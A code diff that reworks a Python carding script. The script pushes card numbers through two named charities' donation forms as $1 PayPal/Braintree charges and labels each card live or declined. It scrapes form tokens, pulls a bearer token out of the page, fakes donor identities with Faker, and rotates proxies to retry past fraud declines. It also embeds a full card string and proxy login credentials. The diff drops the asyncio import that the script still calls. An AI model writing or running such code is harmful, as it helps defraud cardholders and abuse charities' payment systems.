@@ -1,12 +1,13 @@
 import re
 import json
-import asyncio
+import base64
+import secrets
 import uuid
-from urllib.parse import urlparse, parse_qs
 from faker import Faker
 from curl_cffi.requests import AsyncSession
+from proxy_manager import get_next_proxy   # استيراد الدالة المطلوبة
 
-fake = Faker("en_US")
+fake = Faker("en_UK")
 
 class tools:
     @staticmethod
@@ -57,240 +58,258 @@ class tools:
         return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")
 
 RESPONSE_MAP = {
-    '"responseCode":"1"': ("Success", "Charged - Approved ✅", True),
-    '"resultCode":"Ok"': ("Success", "Charged - Approved ✅", True),
-    "insufficient fund": ("Declined", "Insufficient Funds ❌", False),
-    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
-    "credit limit": ("Declined", "Credit Limit Exceeded ❌", False),
-    "exceeds balance": ("Declined", "Exceeds Balance ❌", False),
-    "over credit limit": ("Declined", "Over Credit Limit ❌", False),
-    "exceeds withdrawal": ("Declined", "Exceeds Withdrawal ❌", False),
-    "expired": ("Declined", "Expired Card ❌", False),
-    "expired_card": ("Declined", "Expired Card ❌", False),
-    '"errorCode":"8"': ("Declined", "Expired Card ❌", False),
-    '"errorCode":"6"': ("Declined", "Invalid Card Number ❌", False),
-    "card number is invalid": ("Declined", "Invalid Card Number ❌", False),
-    "invalid_card": ("Declined", "Invalid Card Number ❌", False),
-    '"errorCode":"7"': ("Declined", "Invalid Expiration Date ❌", False),
-    "expiration date is invalid": ("Declined", "Invalid Expiration Date ❌", False),
-    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
-    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
-    '"errorCode":"4"': ("Declined", "Lost Or Stolen ❌", False),
-    "pick up card": ("Declined", "Lost Or Stolen ❌", False),
-    "pickup_card_special_conditions": ("Declined", "Pickup Card Special Conditions ❌", False),
-    "cvv2_failure": ("Declined", "CVV2 Failure ❌", False),
-    '"errorCode":"65"': ("Declined", "CVV2 Failure ❌", False),
-    '"errorCode":"78"': ("Declined", "CVV2 Failure ❌", False),
-    "avs mismatch": ("Declined", "AVS Mismatch ❌", False),
-    '"errorCode":"27"': ("Declined", "AVS Mismatch ❌", False),
-    '"errorCode":"127"': ("Declined", "AVS Mismatch ❌", False),
-    '"errorCode":"45"': ("Declined", "AVS + CVV Mismatch ❌", False),
-    "the transaction for donation": ("Declined", "the transaction for donation ❌", False),
-    "was declined": ("Declined", "Was Declined ❌", False),
-    "transaction failed": ("Declined", "Failed ❌", False),
-    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
-    "fraud": ("Declined", "Suspected Fraud ❌", False),
-    "security_violation": ("Declined", "Security Violation ❌", False),
-    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
-    '"errorCode":"250"': ("Declined", "Blocked IP (FDS) ❌", False),
-    '"errorCode":"251"': ("Declined", "Fraud Filter Decline ❌", False),
-    "cryptographic_failure": ("Declined", "Cryptographic Failure ❌", False),
+    "true": ("Success", "Charged - $1 ! ✅", True),
+    "sucsess": ("Success", "Charged - $1 ! ✅", True),
     "do_not_honor": ("Declined", "Do Not Honor ❌", False),
-    '"errorCode":"2"': ("Declined", "Do Not Honor ❌", False),
     "account_closed": ("Declined", "Account Closed ❌", False),
     "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
-    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
+    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
+    "cvv2_failure": ("Declined", "CVV2_FAILURE ❌", False),
+    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
     "invalid_account": ("Declined", "Invalid Account ❌", False),
-    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
-    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
-    "generic_decline": ("Declined", "Generic Decline ❌", False),
-    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
-    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
-    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
-    "payment_denied": ("Declined", "Payment Denied ❌", False),
-    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
     "reattempt_not_permitted": ("Declined", "Reattempt Not Permitted ❌", False),
-    "tx_attempts_exceed_limit": ("Declined", "TX Attempts Exceed Limit ❌", False),
-    "transaction_cannot_be_completed": ("Declined", "Transaction Cannot Be Completed ❌", False),
-    "declined_please_retry": ("Declined", "Declined Please Retry ❌", False),
-    "duplicate": ("Declined", "Duplicate Transaction ❌", False),
-    '"errorCode":"11"': ("Declined", "Duplicate Transaction ❌", False),
-    '"errorCode":"13"': ("Declined", "Merchant Account Error ❌", False),
-    '"errorCode":"17"': ("Declined", "Card Type Not Accepted ❌", False),
-    '"errorCode":"3"': ("Declined", "Voice Auth Required ❌", False),
-    '"responseCode":"2"': ("Declined", "Declined ❌", False),
-    '"responseCode":"3"': ("Declined", "Processing Error ❌", False),
-    '"responseCode":"4"': ("Declined", "Held For Review ❌", False),
-    '"E00005"': ("Declined", "API Authentication Error ❌", False),
-    '"E00006"': ("Declined", "API Authentication Error ❌", False),
-    '"E00007"': ("Declined", "API Authentication Error ❌", False),
-    '"E00008"': ("Declined", "API Permission Error ❌", False),
-    '"E00009"': ("Declined", "API Permission Error ❌", False),
-    '"E00010"': ("Declined", "API Permission Error ❌", False),
-    '"E00011"': ("Declined", "API Permission Error ❌", False),
+    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
+    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
+    "pickup_card_special_conditions": ("Declined", "Pick Card Special Conditions ❌", False),
+    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
+    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
+    "generic_decline": ("Declined", "Generic Decline ❌", False),
+    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
+    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
+    "payment_denied": ("Declined", "Payment Denied ❌", False),
+    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
+    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
+    "security_violation": ("Declined", "Security Violation ❌", False),
+    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
+    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
+    "expired_card": ("Declined", "Expired Card ❌", False),
+    "cryptographic_failure": ("Declined", "CRYPTOGRAPHIC_FAILURE ❌", False),
+    "transaction_cannot_be_completed": ("Declined", "TRANSACTION_CANNOT_BE_COMPLETED ❌", False),
+    "declined_please_retry": ("Declined", "DECLINED_PLEASE_RETRY_LATER ❌", False),
+    "tx_attempts_exceed_limit": ("Declined", "TX_ATTEMPTS_EXCEED_LIMIT ❌", False),
 }
 
 class Gateway:
     @staticmethod
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
-        token = str(uuid.uuid4())
-        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
+        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
+        token = secrets.token_hex(16)
 
         async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
             try:
-                # Step 1: GET donation form page to extract parameters
+                # Step 1: GET donation page
                 headers_init = {
-                    "referer": "https://www.ohelfamily.org/donate/",
-                }
-                params_init = {
-                    "givewp-route": "donation-form-view",
-                    "form-id": "794",
-                    "locale": "en_US",
+                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                 }
                 resp_init = await session.get(
-                    "https://www.ohelfamily.org/",
-                    params=params_init,
+                    "https://bukjeh.org/donations/donation-2023-2-3/",
                     headers=headers_init,
                 )
                 html = resp_init.text
-                donate_url = tools.find_between(html, '"donateUrl":"', '"')
-                if not donate_url:
-                    return "Error", "donateUrl not found", False
-                clientPublicKey = tools.find_between(html, '"clientPublicKey":"', '"')
-                if not clientPublicKey:
-                    return "Error", "clientPublicKey not found", False
-                apiLoginId = tools.find_between(html, '"apiLoginId":"', '"')
-                if not apiLoginId:
-                    return "Error", "apiLoginId not found", False
+                hash_val = tools.find_between(html, 'name="give-form-hash" value="', '"')
+                pre = tools.find_between(html, 'name="give-form-id-prefix" value="', '"')
+                give = tools.find_between(html, 'name="give-form-id" value="', '"')
+                if not hash_val or not pre or not give:
+                    return "Error", "Missing form parameters", False
 
-                parsed_url = urlparse(donate_url)
-                qs = parse_qs(parsed_url.query)
-                route_sig = qs.get('givewp-route-signature', [None])[0]
-                route_id = qs.get('givewp-route-signature-id', [None])[0]
-                route_exp = qs.get('givewp-route-signature-expiration', [None])[0]
-                if not route_sig or not route_id or not route_exp:
-                    return "Error", "Missing route signature parameters", False
+                enc_match = re.search(r'"data-client-token":"(.*?)"', html)
+                if not enc_match:
+                    return "Error", "data-client-token not found", False
+                enc = enc_match.group(1)
+                dec = base64.b64decode(enc).decode("utf-8")
+                au_match = re.search(r'"accessToken":"(.*?)"', dec)
+                if not au_match:
+                    return "Error", "accessToken not found", False
+                au = au_match.group(1)
 
-                # Step 2: Tokenize card via Authorize.net
-                headers_auth = {
-                    "origin": "https://www.ohelfamily.org",
-                    "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
-                    "content-type": "application/json; charset=UTF-8",
+                # Step 2: First AJAX - give_process_donation
+                headers_ajax1 = {
+                    "origin": "https://bukjeh.org",
+                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "x-requested-with": "XMLHttpRequest",
                 }
-                json_auth = {
-                    "securePaymentContainerRequest": {
-                        "merchantAuthentication": {
-                            "name": apiLoginId,
-                            "clientKey": clientPublicKey,
-                        },
-                        "data": {
-                            "type": "TOKEN",
-                            "id": token,
-                            "token": {
-                                "cardNumber": card_data["cc"],
-                                "expirationDate": f"{card_data['mm']} {card_data['yy']}",
-                                "cardCode": card_data["cvv"],
+                data_ajax1 = {
+                    "give-fee-amount": "0",
+                    "give-fee-mode-enable": "false",
+                    "give-fee-status": "enabled",
+                    "give-honeypot": "",
+                    "give-form-id-prefix": pre,
+                    "give-form-id": give,
+                    "give-form-title": "Help us make A'amar",
+                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "give-form-minimum": "1.00",
+                    "give-form-maximum": "999999.99",
+                    "give-form-hash": hash_val,
+                    "give-price-id": "3",
+                    "give-recurring-logged-in-only": "",
+                    "give-logged-in-only": "1",
+                    "_give_is_donation_recurring": "0",
+                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+                    "give-amount": "1.00",
+                    "give-recurring-period-donors-choice": "month",
+                    "payment-mode": "paypal-commerce",
+                    "give_first": user_data["first"],
+                    "give_last": user_data["last"],
+                    "give_email": user_data["email"],
+                    "card_name": user_data["name"],
+                    "card_exp_month": "",
+                    "card_exp_year": "",
+                    "give_action": "purchase",
+                    "give-gateway": "paypal-commerce",
+                    "action": "give_process_donation",
+                    "give_ajax": "true",
+                }
+                await session.post(
+                    "https://bukjeh.org/wp-admin/admin-ajax.php",
+                    headers=headers_ajax1,
+                    data=data_ajax1,
+                )
+
+                # Step 3: Second AJAX - create order
+                headers_ajax2 = {
+                    "origin": "https://bukjeh.org",
+                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                }
+                params_ajax2 = {
+                    "action": "give_paypal_commerce_create_order",
+                }
+                data_ajax2 = {
+                    "give-fee-amount": "0",
+                    "give-fee-mode-enable": "false",
+                    "give-fee-status": "enabled",
+                    "give-honeypot": "",
+                    "give-form-id-prefix": pre,
+                    "give-form-id": give,
+                    "give-form-title": "Help us make A'amar",
+                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "give-form-minimum": "1.00",
+                    "give-form-maximum": "999999.99",
+                    "give-form-hash": hash_val,
+                    "give-price-id": "3",
+                    "give-recurring-logged-in-only": "",
+                    "give-logged-in-only": "1",
+                    "_give_is_donation_recurring": "0",
+                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+                    "give-amount": "1.00",
+                    "give-recurring-period-donors-choice": "month",
+                    "give_stripe_payment_method": "",
+                    "payment-mode": "paypal-commerce",
+                    "give_first": user_data["first"],
+                    "give_last": user_data["last"],
+                    "give_email": user_data["email"],
+                    "card_name": user_data["name"],
+                    "card_exp_month": "",
+                    "card_exp_year": "",
+                    "give-gateway": "paypal-commerce",
+                }
+                resp_ajax2 = await session.post(
+                    "https://bukjeh.org/wp-admin/admin-ajax.php",
+                    params=params_ajax2,
+                    headers=headers_ajax2,
+                    data=data_ajax2,
+                )
+                ajax2_json = resp_ajax2.json()
+                order_id = ajax2_json.get("data", {}).get("id")
+                if not order_id:
+                    return "Error", "Failed to create PayPal order", False
+
+                # Step 4: Confirm payment source via PayPal
+                headers_paypal = {
+                    "authorization": f"Bearer {au}",
+                    "origin": "https://assets.braintreegateway.com",
+                    "referer": "https://assets.braintreegateway.com/",
+                    "content-type": "application/json",
+                    "paypal-client-metadata-id": token,
+                }
+                json_paypal = {
+                    "payment_source": {
+                        "card": {
+                            "number": card_data["cc"],
+                            "expiry": f"20{card_data['yy']}-{card_data['mm']}",
+                            "security_code": card_data["cvv"],
+                            "attributes": {
+                                "verification": {
+                                    "method": "SCA_WHEN_REQUIRED",
+                                },
                             },
                         },
                     },
+                    "application_context": {
+                        "vault": False,
+                    },
                 }
-                resp_auth = await session.post(
-                    "https://api2.authorize.net/xml/v1/request.api",
-                    headers=headers_auth,
-                    json=json_auth,
+                resp_paypal = await session.post(
+                    f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
+                    headers=headers_paypal,
+                    json=json_paypal,
                 )
-                auth_text = resp_auth.text
-                data_value = tools.find_between(auth_text, '"dataValue":"', '"')
-                data_descriptor = tools.find_between(auth_text, '"dataDescriptor":"', '"')
-                if not data_value or not data_descriptor:
-                    return "Error", "Failed to extract dataValue or dataDescriptor", False
+                paypal_text = resp_paypal.text.lower()
 
-                # Step 3: Submit donation form (application/x-www-form-urlencoded)
-                headers_donate = {
-                    "origin": "https://www.ohelfamily.org",
-                    "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
+                # Step 5: Third AJAX - approve order
+                headers_ajax3 = {
+                    "origin": "https://bukjeh.org",
+                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                 }
-                params_donate = {
-                    "givewp-route": "donate",
-                    "givewp-route-signature": route_sig,
-                    "givewp-route-signature-id": "givewp-donate",
-                    "givewp-route-signature-expiration": route_exp,
+                params_ajax3 = {
+                    "action": "give_paypal_commerce_approve_order",
+                    "order": order_id,
                 }
-                data_donate = {
-                    "amount": "1",
-                    "currency": "USD",
-                    "donationType": "single",
-                    "subscriptionPeriod": "one-time",
-                    "subscriptionFrequency": "1",
-                    "subscriptionInstallments": "0",
-                    "formId": "794",
-                    "p2pSourceID": "0",
-                    "enableTribute": "hide",
-                    "tributeType": "In honor of",
-                    "tributesSendNotification": "send",
-                    "gatewayId": "authorize",
-                    "feeRecovery": "0",
-                    "p2pSourceType": "",
-                    "honorific": "Mr.",
-                    "firstName": user_data["first"],
-                    "lastName": user_data["last"],
-                    "email": user_data["email"],
-                    "phone": user_data["phone"],
-                    "constantcontact": "true",
-                    "country": "US",
-                    "address1": user_data["address"],
-                    "address2": "",
-                    "city": user_data["city"],
-                    "state": user_data["state"],
-                    "zip": user_data["zip"],
-                    "comment": "",
-                    "dtd": "undefined",
-                    "feeRecoveryConfirmation": "",
-                    "donationBirthday": "",
-                    "originUrl": "https://www.ohelfamily.org/donate/",
-                    "isEmbed": "true",
-                    "embedId": "give-form-shortcode-2",
-                    "locale": "en_US",
-                    "gatewayData[give_authorize_data_descriptor]": data_descriptor,
-                    "gatewayData[give_authorize_data_value]": data_value,
+                data_ajax3 = {
+                    "give-fee-amount": "0",
+                    "give-fee-mode-enable": "false",
+                    "give-fee-status": "enabled",
+                    "give-honeypot": "",
+                    "give-form-id-prefix": pre,
+                    "give-form-id": give,
+                    "give-form-title": "Help us make A'amar",
+                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "give-form-minimum": "1.00",
+                    "give-form-maximum": "999999.99",
+                    "give-form-hash": hash_val,
+                    "give-price-id": "3",
+                    "give-recurring-logged-in-only": "",
+                    "give-logged-in-only": "1",
+                    "_give_is_donation_recurring": "0",
+                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+                    "give-amount": "1.00",
+                    "give-recurring-period-donors-choice": "month",
+                    "give_stripe_payment_method": "",
+                    "payment-mode": "paypal-commerce",
+                    "give_first": user_data["first"],
+                    "give_last": user_data["last"],
+                    "give_email": user_data["email"],
+                    "card_name": user_data["name"],
+                    "card_exp_month": "",
+                    "card_exp_year": "",
+                    "give-gateway": "paypal-commerce",
                 }
-                resp_donate = await session.post(
-                    "https://www.ohelfamily.org/",
-                    params=params_donate,
-                    headers=headers_donate,
-                    data=data_donate,
+                resp_ajax3 = await session.post(
+                    "https://bukjeh.org/wp-admin/admin-ajax.php",
+                    params=params_ajax3,
+                    headers=headers_ajax3,
+                    data=data_ajax3,
                 )
-                response_text = resp_donate.text.lower()
+                approve_text = resp_ajax3.text.lower()
 
-                # Step 4: Classify using RESPONSE_MAP
+                # Combine both responses for classification
+                combined = paypal_text + " " + approve_text
+
                 for key, (status, msg, is_live) in RESPONSE_MAP.items():
-                    if key in response_text:
+                    if key in combined:
                         return status, msg, is_live
 
-                # Fallback: try to parse JSON for deeper error messages
+                # Fallback: try JSON error extraction
                 try:
-                    error_data = resp_donate.json()
-                    if 'transactionResponse' in error_data:
-                        tx = error_data['transactionResponse']
-                        if 'errors' in tx:
-                            errs = tx['errors']
-                            if isinstance(errs, dict) and 'error' in errs:
-                                err_text = errs['error'][0].get('errorText', '')
-                            elif isinstance(errs, list):
-                                err_text = errs[0].get('errorText', '')
-                            else:
-                                err_text = str(errs)
-                            if err_text:
-                                return "Declined", f"{err_text} ❌", False
-                        elif 'messages' in tx:
-                            msgs = tx['messages']
-                            if isinstance(msgs, dict) and 'message' in msgs:
-                                err_text = msgs['message'][0].get('description', '')
-                                if err_text:
-                                    return "Declined", f"{err_text} ❌", False
-                    elif 'data' in error_data and 'error' in error_data['data']:
-                        err_text = error_data['data']['error']
-                        return "Declined", f"{err_text} ❌", False
+                    error_data = resp_ajax3.json()
+                    if 'data' in error_data and 'error' in error_data['data']:
+                        err_msg = error_data['data']['error']
+                        return "Declined", f"{err_msg} ❌", False
                 except:
                     pass
 
@@ -300,37 +319,65 @@ class Gateway:
                 return "Error", f"Exception: {str(e)}", False
 
 
-async def process_Au_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
+async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
+    """
+    معالجة الدفع مع نظام إعادة محاولة (Retry) عند الحصول على "Order Not Approved".
+    - الحد الأقصى للمحاولات: 5.
+    - كل محاولة تستخدم بيانات مستخدم جديدة وبروكسي جديد (يتم جلبه من get_next_proxy).
+    - أي رد آخر غير "Order Not Approved" ينهي المحاولات فوراً ويعيد النتيجة.
+    - إذا استمرت جميع المحاولات الخمس بـ "Order Not Approved"، يتم إرجاع النتيجة النهائية.
+    """
     card_data = tools.getcard(card_line)
     if not card_data["cc"]:
         return "Failed", "Invalid card format", False
 
-    user_data = tools.userdata()
-    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+    max_attempts = 5
+    last_result = None
 
-    return await Gateway.charge_card(
-        card_data=card_data,
-        user_data=user_data,
-        proxies=proxies,
-    )
+    for attempt in range(max_attempts):
+        # 1. بيانات مستخدم جديدة
+        user_data = tools.userdata()
+
+        # 2. بروكسي جديد من proxy_manager
+        proxy_url_new = get_next_proxy()  # قد ترجع None
+        proxies = {"http": proxy_url_new, "https": proxy_url_new} if proxy_url_new else None
+
+        # 3. تنفيذ عملية الدفع
+        status, msg, is_live = await Gateway.charge_card(
+            card_data=card_data,
+            user_data=user_data,
+            proxies=proxies,
+        )
+
+        # 4. التحقق من النتيجة
+        if "Order Not Approved" in msg:
+            # هذه الحالة فشل، نستمر في المحاولات ما لم تكن الأخيرة
+            if attempt == max_attempts - 1:
+                # المحاولة الأخيرة أيضاً فشلت، نعيد هذه النتيجة
+                return status, msg, is_live
+            # خلاف ذلك، نواصل الحلقة
+            continue
+        else:
+            # أي رد آخر (نجاح أو فشل مختلف) نعتبره نهائياً ونوقفه
+            return status, msg, is_live
+
+    # في حال خرجت الحلقة دون return (لن يحدث) نعيد افتراضي
+    return "Error", "Max attempts exceeded unexpectedly", False
     
 async def main():
-    # بطاقة اختبار قياسية لـ Stripe
     test_card = "4211566115568609|12|28|321"
-    
-    # البروكسي الخاص بك بالصيغة الصحيحة
     proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"
 
-    print("🚀 جاري اختبار البوابة (ST Charge)...")
-    print(f"💳 البطاقة: {test_card}")
-    print(f"🌐 جاري الاتصال عبر: {proxy}")
-    
-    status, message, is_live = await process_Au_1(test_card, proxy_url=proxy)
-    
-    print("\n--- نتيجة التنفيذ ---")
-    print(f"الحالة  : {status}")
-    print(f"الرسالة : {message}")
-    print(f"مقبولة  : {is_live}")
+    print("🚀 Testing gateway (ST Charge)...")
+    print(f"💳 Card: {test_card}")
+    print(f"🌐 Connecting via: {proxy}")
+
+    status, message, is_live = await process_paypal_1(test_card, proxy_url=proxy)
+
+    print("\n--- Execution Result ---")
+    print(f"Status  : {status}")
+    print(f"Message : {message}")
+    print(f"Live    : {is_live}")
 
 if __name__ == "__main__":
     asyncio.run(main())
